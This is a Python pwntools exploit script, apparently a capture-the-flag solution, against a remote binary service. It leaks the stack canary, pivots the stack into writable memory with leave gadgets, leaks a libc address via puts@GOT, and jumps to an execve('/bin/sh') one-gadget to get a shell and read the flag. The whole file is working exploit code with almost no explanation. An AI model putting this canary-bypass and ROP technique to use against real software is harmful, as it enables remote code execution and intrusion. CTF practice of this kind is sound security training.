from pwn import *

context.os = "linux"
context.arch = "amd64"
context.log_level = "debug"

io = remote("nc1.ctfplus.cn", 30730)
elf = ELF("./pwn")
rop = ROP(elf)
libc = ELF("./libc.so.6")

padding = b'A' * 40

s_buf_siz = 0x30
canary_buf_siz = 0x8
buf_siz = s_buf_siz + canary_buf_siz

vmmap_rw_1 = 0x404800
vmmap_rw_2 = 0x404700
vmmap_rw_3 = 0x404600

pop_rdi = 0x40123e
leave = 0x4013af
retn = pop_rdi + 1
read_0x40 = 0x401351
execve_binsh_offset = 0xebc81

io.recvuntil(b"Tell me what's your name?\n")
io.send(padding)
io.recvuntil(padding)
canary = u64(io.recv(6) + b"\x00\x00")

io.recvuntil(b" What can you do ?\n")
# now at 'read'
io.send(flat(   # 0x40 = 64 bytes
    padding,    # 40 bytes overriding 's' buffer
    canary,     # 8 bytes idempotently overriding 'v2' canary buffer
    vmmap_rw_1, # 8 bytes overriding saved RBP
    read_0x40,  # 8 bytes overriding saved RIP
))

# now at 'read'
io.send(flat(
    vmmap_rw_2,

    pop_rdi, elf.got["puts"],
    elf.plt["puts"],

    read_0x40,

    canary,
    vmmap_rw_1 - buf_siz, 
    leave
))

for i in range(2):
    io.recvuntil(b"Congratulations!\n")
libc.address = u64(io.recv(6) + b'\x00\x00') - libc.sym.puts

io.send(flat(
    vmmap_rw_3,

    libc.address + execve_binsh_offset,

    b'A' * 0x18,

    canary,
    vmmap_rw_2 - buf_siz,
    leave
))

io.recvuntil(b"Congratulations!\n")
io.sendline(b"cat flag\n")
print(io.recvuntil(b"\n", drop=True).decode())

io.close()